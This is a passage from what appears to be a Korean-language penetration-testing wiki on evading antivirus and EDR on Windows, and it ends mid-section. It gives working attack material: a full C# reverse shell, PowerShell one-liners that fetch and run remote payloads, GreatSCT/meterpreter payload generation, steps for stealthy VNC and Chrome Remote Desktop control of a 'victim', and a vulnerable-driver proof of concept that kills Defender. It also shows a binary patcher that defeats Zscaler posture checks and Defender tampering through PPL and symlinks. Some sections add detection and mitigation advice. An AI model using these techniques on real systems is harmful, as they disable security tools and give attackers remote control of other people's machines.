Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 애플리케이션과 시스템 구성요소가 **이벤트를 기록할 수 있게 해주는** 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 이벤트를 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하게 함으로써 수행되며, 결과적으로 해당 프로세스의 ETW 로깅을 비활성화합니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인하세요.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 방법은 오래전부터 알려져 왔으며, AV에 걸리지 않고 post-exploitation 도구를 실행하는 매우 좋은 방법입니다.

페이로드가 디스크를 건드리지 않고 직접 메모리에 로드되기 때문에, 전체 프로세스에 대해 AMSI 패치만 신경 쓰면 됩니다.

대부분의 C2 프레임워크 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.)는 이미 C# 어셈블리를 메모리에서 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

이는 **새로운 희생 프로세스를 생성(spawning)** 하고, 그 새 프로세스에 post-exploitation 악성 코드를 주입하여 실행한 후 완료되면 해당 프로세스를 종료하는 방법입니다. 장단점이 있습니다. fork and run 방식의 장점은 실행이 우리의 Beacon 임플란트 프로세스 **외부**에서 일어난다는 점입니다. 이는 post-exploitation 작업이 잘못되거나 탐지되더라도 우리의 임플란트가 **살아남을 가능성**이 훨씬 크다는 것을 의미합니다. 단점은 Behavioural Detections에 의해 적발될 **가능성**이 더 높다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

이는 post-exploitation 악성 코드를 **자기 자신의 프로세스**에 주입하는 방법입니다. 이렇게 하면 새 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 페이로드 실행 중 문제가 생기면 프로세스가 크래시할 수 있어 **beacon을 잃을 가능성**이 훨씬 큽니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

또한 C# Assemblies를 **PowerShell에서** 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 참고하세요.

## 다른 프로그래밍 언어 사용

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 침해된 머신이 접근할 수 있게 하면 다른 언어로 악성 코드를 실행하는 것이 가능합니다.

SMB 공유의 Interpreter Binaries와 환경에 대한 접근을 허용하면 침해된 머신의 메모리 내에서 해당 언어들로 **임의 코드를 실행할 수 있습니다**.

리포지토리에서는: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 수 있는 유연성**이 더 있다고 합니다. 이 언어들로 된 무작위 비난독화 reverse shell 스크립트로 테스트한 결과 성공을 거뒀습니다.

## TokenStomping

Token stomping은 공격자가 **접근 토큰이나 EDR 또는 AV 같은 보안 제품을 조작**하여 권한을 낮춤으로써 프로세스는 종료되지 않지만 악성 활동을 검사할 권한이 없게 만드는 기술입니다.

이를 방지하기 위해 Windows는 **외부 프로세스가** 보안 프로세스의 토큰에 대한 핸들을 획득하지 못하도록 할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 신뢰된 소프트웨어 사용

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), 피해자의 PC에 Chrome Remote Desktop을 배포한 뒤 이를 이용해 장악하고 지속성을 유지하는 것이 비교적 쉽습니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고, "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭해 MSI 파일을 다운로드합니다.
2. 피해자 기기에서 설치 프로그램을 조용히 실행합니다(관리자 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 'Next'를 클릭합니다. 마법사가 권한을 요청하면 'Authorize' 버튼을 클릭해 계속합니다.
4. 약간의 조정을 해서 다음 파라미터를 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (참고: pin 파라미터로 GUI를 사용하지 않고도 핀을 설정할 수 있습니다.)

## 고급 회피

회피는 매우 복잡한 주제입니다. 때로는 한 시스템에서만도 여러 서로 다른 텔레메트리 소스를 고려해야 하므로, 성숙한 환경에서는 완전히 탐지되지 않는 상태를 유지하는 것은 사실상 불가능합니다.

공격 대상 환경마다 각각의 강점과 약점이 있습니다.

더 많은 고급 회피 기법을 배우고 싶다면 [@ATTL4S](https://twitter.com/DaniLJ94)의 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

또한 [@mariuszbit](https://twitter.com/mariuszbit)의 Evasion in Depth에 관한 훌륭한 강연도 있습니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **오래된 기법**

### **Defender가 악성으로 판단하는 부분 확인하기**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 **바이너리의 일부를 제거**하면서 **Defender가 어떤 부분을** 악성으로 판단하는지 찾아내어 분리해줍니다.\
같은 일을 하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 공개 웹 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 제공합니다.

### **Telnet Server**

Windows10 이전에는 모든 Windows에 관리자 권한으로 설치할 수 있는 **Telnet server**가 포함되어 있었습니다. 설치하려면:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하게 만들고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: _**winvnc.exe**_을 실행하고 서버를 구성합니다:

- 옵션 _Disable TrayIcon_을 활성화합니다
- _VNC Password_에 암호를 설정합니다
- _View-Only Password_에 암호를 설정합니다

그런 다음, 바이너리 _**winvnc.exe**_ 및 **새로** 생성된 파일 _**UltraVNC.ini**_을 **victim** 안으로 이동합니다

#### **Reverse connection**

**attacker**는 자신의 **host**에서 바이너리 `vncviewer.exe -listen 5900`을 실행해야 하며, 역방향 **VNC connection**을 수신할 준비를 합니다. 그런 다음 **victim** 내에서: winvnc 데몬 `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다

**WARNING:** 은밀함을 유지하려면 다음을 하지 말아야 합니다

- 이미 실행 중이면 `winvnc`를 시작하지 마십시오. 그렇지 않으면 [popup](https://i.imgur.com/1SROTTl.png)이 발생합니다. 실행 여부는 `tasklist | findstr winvnc`로 확인하세요
- 동일한 디렉터리에 `UltraVNC.ini`가 없으면 `winvnc`를 시작하지 마십시오. 그러면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
- 도움말을 위해 `winvnc -h`를 실행하지 마십시오. [popup](https://i.imgur.com/oc18wcu.png)이 발생합니다

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 **start the lister**를 `msfconsole -r file.rc`로 시작하고, 다음 명령으로 **xml payload**를 **execute**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell을 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 컴파일러
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603은 엔드포인트 보호를 비활성화한 후 랜섬웨어를 배포하기 위해 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 이용했습니다. 이 도구는 **자체적으로 취약하지만 *signed* 된 드라이버**를 포함하고 있으며, 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행합니다.

핵심 요점
1. **Signed driver**: 디스크에 배달되는 파일은 `ServiceMouse.sys`이지만, 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 보유하고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드됩니다.
2. 서비스 설치:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **kernel 서비스**로 등록하고, 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 사용자 공간에서 접근 가능하도록 만듭니다.
3. 드라이버가 노출하는 IOCTLs
| IOCTL code | 기능 |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의 프로세스를 종료 (Defender/EDR 서비스를 종료하는 데 사용됨) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. 작동 이유: BYOVD는 사용자 모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 Protected 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능에 상관없이 커널 객체를 변조할 수 있습니다.

탐지 / 완화
• Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys` 로드를 거부하도록 합니다.  
• 새로운 *kernel* 서비스 생성 모니터링 및 드라이버가 모든 사용자가 쓰기 가능한 디렉터리에서 로드되었거나 허용 목록에 없는 경우 경보를 발생시킵니다.  
• 사용자 모드 핸들이 커스텀 디바이스 객체에 열리고 이어서 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소와 통신하기 위해 Windows RPC를 사용합니다. 두 가지 설계상의 약점이 전체 우회를 가능하게 합니다:

1. Posture 평가는 **완전히 클라이언트 측**에서 이루어지며 (서버에는 boolean 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **Zscaler에 의해 서명되었는지**(`WinVerifyTrust`를 통해)만 검증합니다.

디스크에 있는 서명된 바이너리 4개를 **패치함으로써** 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | 원래 로직(패치된 부분) | 결과 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하도록 변경되어 모든 체크가 준수로 간주됨 |
| `ZSAService.exe` | `WinVerifyTrust`로의 간접 호출 | NOP 처리 ⇒ 어떤 프로세스(심지어 unsigned)도 RPC 파이프에 바인딩할 수 있음 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체됨 |
| `ZSATunnel.exe` | 터널 무결성 검사 | 단축(우회)됨 |

간단한 패처 발췌:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **All** posture checks가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 named-pipe RPC endpoints를 열 수 있습니다 (예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 탈취된 호스트는 Zscaler 정책으로 정의된 내부 네트워크에 제한 없이 접근할 수 있게 됩니다.

이 사례 연구는 순수하게 클라이언트 측 신뢰 결정과 간단한 서명 검사가 몇 바이트의 패치로 어떻게 무력화될 수 있는지를 보여줍니다.

## Protected Process Light (PPL)을 악용해 LOLBINs로 AV/EDR을 변조하기

Protected Process Light (PPL)은 signer/level 계층을 강제하여 동일하거나 더 높은 수준의 protected process만 상호 변조할 수 있도록 합니다. 공격적으로, 합법적으로 PPL이 활성화된 바이너리를 실행하고 인수를 제어할 수 있다면, 무해한 기능(예: 로깅)을 AV/EDR에서 사용하는 보호된 디렉터리에 대해 제약된 PPL 기반의 쓰기 프리미티브로 전환할 수 있습니다.

프로세스가 PPL로 실행되려면
- 대상 EXE(및 로드된 DLLs)는 PPL-capable EKU로 서명되어 있어야 합니다.
- 프로세스는 CreateProcess로 생성되어야 하며 플래그: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`를 사용해야 합니다.
- 바이너리의 signer와 일치하는 호환 가능한 protection level을 요청해야 합니다(예: anti-malware 서명자에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨은 생성 시 실패합니다.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- 오픈소스 헬퍼: CreateProcessAsPPL (protection level을 선택하고 인수를 대상 EXE로 전달):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 사용 패턴:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe`는 자체적으로 프로세스를 생성하며 호출자가 지정한 경로에 로그 파일을 쓰는 인수를 허용합니다.
- PPL 프로세스로 실행되면 파일 쓰기는 PPL 보호 하에서 이루어집니다.
- ClipUp은 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호된 위치를 가리킬 때 8.3 short paths를 사용하세요.

8.3 short path 도우미
- 짧은 이름 나열: 각 상위 디렉터리에서 `dir /x` 실행.
- cmd에서 short path 추출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (요약)
1) PPL 가능 LOLBIN(ClipUp)을 실행기(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 실행합니다.
2) ClipUp에 로그 경로 인수를 전달하여 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성이 일어나도록 강제합니다. 필요하면 8.3 short names를 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 열려 있거나 잠겨 있는 경우(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 되도록 더 먼저 실행되는 auto-start service를 설치하세요. Process Monitor(boot logging)로 부팅 순서를 검증하세요.
4) 재부팅 시 PPL 보호하의 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일이 손상되고 시작을 방해합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 쓰는 내용은 위치(placement) 외에는 제어할 수 없습니다; 이 원시 방법은 정밀한 콘텐츠 삽입보다는 손상(corruption)에 적합합니다.
- 서비스 설치/시작과 재부팅 권한이 필요합니다(로컬 admin/SYSTEM 필요).
- 타이밍이 중요합니다: 대상이 열린 상태여서는 안 되며 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

Detections
- 부팅 전후로 비정상적인 인자와 함께 생성되는 `ClipUp.exe` 프로세스(특히 비표준 런처를 부모로 둔 경우).
- 의심스러운 바이너리를 auto-start로 설정하는 신규 서비스 및 일관되게 Defender/AV보다 먼저 시작되는 서비스. Defender 시작 실패 이전의 서비스 생성/수정 내역을 조사하세요.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예상치 못한 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 non-AV 바이너리에 의한 비정상적인 PPL 레벨 사용을 확인하세요.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있고 어떤 부모 프로세스 아래에서 허용되는지를 제한하세요; 정당한 맥락 외에서의 ClipUp 호출을 차단하세요.
- 서비스 위생: auto-start 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링하세요.
- Defender tamper protection 및 early-launch 보호가 활성화되어 있는지 확인하고, 바이너리 손상을 시사하는 시작 오류를 조사하세요.
- 환경이 허용된다면 보안 도구를 호스팅하는 볼륨에서 8.3 short-name 생성(8.3 짧은 이름 생성)을 비활성화하는 것을 고려하세요(철저히 테스트 필요).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Microsoft Defender 변조 — Platform Version Folder Symlink Hijack

Windows Defender는 실행할 platform을 선택하기 위해 다음 경로 아래의 하위 폴더를 열거합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

그중 사전식(lexicographic)으로 가장 높은 버전 문자열을 가진 하위 폴더(예: `4.18.25070.5-0`)를 선택한 다음 그 위치에서 Defender 서비스 프로세스를 시작합니다(서비스/레지스트리 경로를 해당 위치로 업데이트함). 이 선택은 디렉터리 reparse point(symlinks)를 포함한 디렉터리 항목을 신뢰합니다. 관리자는 이를 이용해 Defender를 공격자가 쓸 수 있는 경로로 리다이렉트하여 DLL sideloading 또는 서비스 중단을 일으킬 수 있습니다.

Preconditions
- Local Administrator (Platform 폴더 아래 디렉터리/심볼릭 링크(symlinks) 생성 필요)
- 재부팅 가능성 또는 Defender platform 재선택을 유발할 수 있는 능력(부팅 시 서비스 재시작)
- 내장 도구만 필요 (mklink)

Why it works
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, platform 선택은 디렉터리 항목을 신뢰하며 대상이 보호/신뢰된 경로로 해석되는지 검증하지 않고 사전식으로 가장 높은 버전 문자열을 선택합니다.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 자신의 폴더를 가리키는 상위 버전 디렉터리 symlink를 생성:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) 리디렉션된 경로에서 MsMpEng.exe (WinDefend)가 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 생성되고 서비스 구성/레지스트리가 해당 위치를 반영하는지 확인해야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLLs를 드롭/교체하여 Defender의 프로세스에서 코드를 실행합니다. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 기술은 자체적으로 권한 상승을 제공하지 않습니다. 관리자 권한이 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams는 런타임 회피(runtime evasion)를 C2 implant에서 대상 모듈 자체로 옮기기 위해 Import Address Table (IAT)을 후킹하고 선택된 APIs를 attacker‑controlled, position‑independent code (PIC)를 통해 라우팅할 수 있습니다. 이는 많은 키트가 노출하는 작은 API 표면(e.g., CreateProcessA)을 넘어 회피를 일반화하고 동일한 보호를 BOFs 및 post‑exploitation DLLs에도 확장합니다.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
